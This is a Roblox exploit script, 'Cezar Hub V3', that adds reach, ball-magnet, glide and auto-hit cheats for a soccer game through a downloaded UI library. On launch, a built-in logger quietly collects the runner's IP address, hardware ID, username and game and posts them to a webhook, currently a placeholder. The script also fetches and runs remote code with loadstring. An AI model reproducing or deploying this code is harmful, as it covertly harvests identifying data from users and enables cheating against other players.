-- [[ CEZAR HUB V3 | THE FINAL HARD-LOCK ]]
-- [[ DM KERSAII ON DC ]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local camera = Workspace.CurrentCamera

-- [[ MEMORY FOR MAP RESTORATION ]]
local MapMemory = {}

-- [[ WEBHOOK LOGGER ]]
local ActionWebhook = "YOUR_WEBHOOK_HERE"
local function ExecuteLogger()
    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if req then
        local ip = "Unknown" pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
        local data = {
            ["embeds"] = {{
                ["title"] = "Cezar Hub V3 | Execution",
                ["color"] = 0x2ccb6f,
                ["fields"] = {
                    {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true},
                    {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                    {["name"] = "HWID", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = false},
                    {["name"] = "Game", ["value"] = "https://www.roblox.com/games/"..game.PlaceId, ["inline"] = false}
                }
            }}
        }
        req({Url = ActionWebhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end
end
task.spawn(ExecuteLogger)

-- [[ UI INITIALIZATION ]]
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
local Window = WindUI:CreateWindow({Title = "Cezar Hub V3", Size = UDim2.fromOffset(600, 850)})
WindUI:AddTheme({Name = "C8ZAR_VOID", Accent = Color3.fromHex("#2ccb6f"), WindowBackground = Color3.fromHex("#080808"), ElementBackground = Color3.fromHex("#121212")})
WindUI:SetTheme("C8ZAR_VOID")

local cfg = {
    r_en = false, rx = 4, ry = 1.4, rz = 4,
    m_en = false, mx = 3, my = 5, mz = 3,
    k_en = false, k_box_buff = 0, k_jy = 5, -- Hard Locked Jump Reach
    react_en = false, gk_en = false, react_percentage = 15,
    collision_en = true, magnet_en = false, 
    helper_en = false, helper_size = 5,
    nomap_en = false, glide_en = false, glide_speed = 25, lastHit = 0
}

-- [[ BALL COLLISION & AGGRESSIVE MAGNET ]]
task.spawn(function()
    while true do
        task.wait()
        local ball = Workspace:FindFirstChild("TPSSystem") and Workspace.TPSSystem:FindFirstChild("TPS")
        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if ball then
            ball.CanCollide = cfg.collision_en
            if cfg.magnet_en and root then
                local dist = (ball.Position - root.Position).Magnitude
                if dist < 22 then
                    ball.AssemblyLinearVelocity = (root.Position - ball.Position).Unit * 18
                    firetouchinterest(root, ball, 0)
                    firetouchinterest(root, ball, 1)
                end
            end
        end
    end
end)

local Main = Window:Section({ Title = "Configurations" })

-- 1. REACH (Navigation Icon)
local RTab = Main:Tab({ Title = "Reach", Icon = "rbxassetid://10723415535" })
RTab:Toggle({ Title = "Enable Reach", Callback = function(v) cfg.r_en = v end })
RTab:Slider({ Title = "Reach X", Value = {Min = 0, Max = 25, Default = 4}, Step = 0.5, Callback = function(v) cfg.rx = v end })
RTab:Slider({ Title = "Reach Y", Value = {Min = 0, Max = 25, Default = 1.4}, Step = 0.5, Callback = function(v) cfg.ry = v end })
RTab:Slider({ Title = "Reach Z", Value = {Min = 0, Max = 25, Default = 4}, Step = 0.5, Callback = function(v) cfg.rz = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do RTab:Button({ Title = "Reach "..p.."%", Callback = function() cfg.react_percentage = p end }) end

-- 2. MOSS (Target Icon)
local MTab = Main:Tab({ Title = "Moss", Icon = "rbxassetid://10734913391" })
MTab:Toggle({ Title = "Enable Moss", Callback = function(v) cfg.m_en = v end })
MTab:Slider({ Title = "Header X", Value = {Min = 0, Max = 15, Default = 3}, Step = 0.5, Callback = function(v) cfg.mx = v end })
MTab:Slider({ Title = "Header Y", Value = {Min = 0, Max = 15, Default = 5}, Step = 0.5, Callback = function(v) cfg.my = v end })
MTab:Slider({ Title = "Header Z", Value = {Min = 0, Max = 15, Default = 3}, Step = 0.5, Callback = function(v) cfg.mz = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do MTab:Button({ Title = "Moss "..p.."%", Callback = function() cfg.react_percentage = p end }) end

-- 3. KHALID (Sliders Icon)
local KTab = Main:Tab({ Title = "Khalid", Icon = "rbxassetid://10723351305" })
KTab:Toggle({ Title = "Enable Khalid", Callback = function(v) cfg.k_en = v end })
KTab:Slider({ Title = "Volley in Box Buff", Value = {Min = 0, Max = 15, Default = 0}, Step = 0.5, Callback = function(v) cfg.k_box_buff = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do KTab:Button({ Title = "Khalid "..p.."%", Callback = function() cfg.react_percentage = p end }) end

-- 4. REACT (Bolt Icon)
local ReTab = Main:Tab({ Title = "React", Icon = "rbxassetid://10723343321" })
ReTab:Toggle({ Title = "Enable React", Callback = function(v) cfg.react_en = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do ReTab:Button({ Title = "React "..p.."%", Callback = function() cfg.react_percentage = p end }) end

-- 5. GK (Shield Icon)
local GKTab = Main:Tab({ Title = "Goalkeeper", Icon = "rbxassetid://10734951152" })
GKTab:Toggle({ Title = "Enable GK Meta", Callback = function(v) cfg.gk_en = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do GKTab:Button({ Title = "GK React "..p.."%", Callback = function() cfg.react_percentage = p end }) end

-- EXTRAS
local Misc = Window:Section({ Title = "Extras" })
local MiTab = Misc:Tab({ Title = "Misc", Icon = "rbxassetid://10734950012" })

MiTab:Toggle({ Title = "Void No Map", Callback = function(v)
    cfg.nomap_en = v
    if v then
        for _, item in pairs(Workspace:GetDescendants()) do
            if item:IsA("BasePart") then
                local n = item.Name:lower()
                local is_safe = n:find("pitch") or n:find("grass") or n:find("goal") or n:find("floor") or n:find("tps") or n:find("ball")
                if not is_safe then
                    MapMemory[item] = {Transparency = item.Transparency, CanCollide = item.CanCollide}
                    item.Transparency = 1; item.CanCollide = false
                end
            end
        end
    else
        for item, state in pairs(MapMemory) do
            if item and item.Parent then item.Transparency = state.Transparency; item.CanCollide = state.CanCollide end
        end
        MapMemory = {}
    end
end })

MiTab:Toggle({ Title = "Air Dribble Helper", Callback = function(v)
    cfg.helper_en = v
    if not v and Workspace:FindFirstChild("C8_Helper") then Workspace.C8_Helper:Destroy() end
end })
MiTab:Slider({ Title = "Helper Size", Value = {Min = 1, Max = 25, Default = 5}, Callback = function(v) cfg.helper_size = v end })
MiTab:Toggle({ Title = "Cezar Magnet", Callback = function(v) cfg.magnet_en = v end })
MiTab:Toggle({ Title = "Enable Glide", Callback = function(v) cfg.glide_en = v end })
MiTab:Slider({ Title = "Glide Speed", Value = {Min = 10, Max = 100, Default = 25}, Callback = function(v) cfg.glide_speed = v end })

-- [[ ENGINE ]]
RunService.Heartbeat:Connect(function()
    local char = LocalPlayer.Character; if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local root, hum = char.HumanoidRootPart, char:FindFirstChild("Humanoid")
    local ball = Workspace:FindFirstChild("TPSSystem") and Workspace.TPSSystem:FindFirstChild("TPS")
    if not ball then return end

    -- GLIDE LOGIC
    if cfg.glide_en and hum.MoveDirection.Magnitude > 0 then
        local vel = hum.MoveDirection * cfg.glide_speed
        -- Fixed: Allows falling but boosts horizontal speed
        root.AssemblyLinearVelocity = Vector3.new(vel.X, root.AssemblyLinearVelocity.Y, vel.Z)
    end

    if cfg.helper_en then
        local h = Workspace:FindFirstChild("C8_Helper") or Instance.new("Part", Workspace)
        h.Name = "C8_Helper"; h.Anchored = true; h.CanCollide = false; h.Transparency = 0.6; h.BrickColor = BrickColor.new("Cyan")
        h.Size = Vector3.new(cfg.helper_size, 0.1, cfg.helper_size); h.Position = ball.Position - Vector3.new(0, 1.4, 0)
    end

    -- HIT ENGINE
    local dx, dy, dz = ball.Position.X - char.Head.Position.X, ball.Position.Y - char.Head.Position.Y, ball.Position.Z - char.Head.Position.Z
    local isAir = hum.FloorMaterial == Enum.Material.Air
    if (cfg.r_en or cfg.m_en or cfg.k_en or cfg.react_en or cfg.gk_en) and tick() - cfg.lastHit > 0.05 then
        local rx = isAir and (5 + cfg.k_box_buff) or cfg.rx
        local mx = cfg.m_en and cfg.mx or rx
        local mz = cfg.m_en and cfg.mz or rx
        if math.abs(dx) <= mx and math.abs(dz) <= mz and math.abs(dy) <= (cfg.m_en and cfg.my or (isAir and 5 or cfg.ry)) then
            if math.random(1, 100) <= cfg.react_percentage then
                firetouchinterest(ball, root, 0); firetouchinterest(ball, root, 1)
                ball.AssemblyLinearVelocity = (camera.CFrame.LookVector * 125) + Vector3.new(0, 8, 0)
                cfg.lastHit = tick()
            end
        end
    end
end)
